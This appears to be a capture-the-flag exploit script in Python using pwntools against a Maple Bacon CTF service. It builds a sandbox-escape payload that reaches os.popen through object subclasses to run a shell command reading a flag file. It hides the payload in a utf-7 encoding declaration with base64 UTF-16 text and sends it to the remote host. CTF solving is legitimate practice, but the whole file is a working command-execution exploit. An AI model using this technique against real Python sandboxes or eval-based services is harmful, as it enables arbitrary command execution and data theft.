from pwn import *
from base64 import b64encode

# can use basically anything that stores the flag in the locals
payload = "a=next(c for c in().__class__.__base__.__subclasses__()if 'wrap_close' in str(c)).__init__.__globals__['popen']('cat /app/flag.txt')._stream.read()"


p = remote('aaas.ctf.maplebacon.org', 1337)

p.sendline(b'#coding=utf7\r+' + b64encode(payload.encode('utf-16-be')).replace(b'=', b''))
p.interactive()